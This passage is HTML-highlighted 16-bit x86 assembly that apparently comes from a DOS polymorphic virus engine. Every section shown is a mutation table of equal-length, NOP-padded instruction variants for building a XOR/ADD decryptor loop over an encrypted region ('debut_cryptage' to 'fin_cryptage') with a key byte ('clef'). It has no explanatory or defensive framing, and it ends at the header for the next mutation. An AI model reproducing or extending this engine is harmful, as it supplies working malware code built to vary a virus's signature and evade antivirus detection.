</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage</span><span class="sc4">-</span><span class="sc5">debut_cryptage</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage</span><span class="sc4">-</span><span class="sc5">debut_cryptage</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc4">-</span><span class="sc5">fin_cryptage</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc1">;6/ lea si, debut_cryptage in 10 bytes (without CX)</span><span class="sc0">

</span><span class="sc5">_mutation6</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc1">;7/ mov di, si in 4 bytes (without CX, SI)</span><span class="sc0">

</span><span class="sc5">_mutation7</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc1">;8/ mov dl, cs:[bp+offset clef] in 10 bytes (without CX, SI, DI)</span><span class="sc0">

</span><span class="sc5">_mutation8</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">clef</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">clef</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">clef</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">clef</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">clef</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">clef</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">clef</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;9/ LODSB in 6 bytes (without CX, SI, DI, DL)</span><span class="sc0">

</span><span class="sc5">_mutation9</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc1">;10/ XOR AL, DL in 10 bytes (without CX, SI, DI, DL, AL)</span><span class="sc0">

</span><span class="sc5">_mutation10</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;10bis/  add AL, DL in 10 bytes (without CX, SI, DI, DL, AL)</span><span class="sc0">

</span><span class="sc5">_mutation10bis</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc1">;10ter/  rol AL in 10 bytes (without CX, SI, DI, DL, AL)</span><span class="sc0">

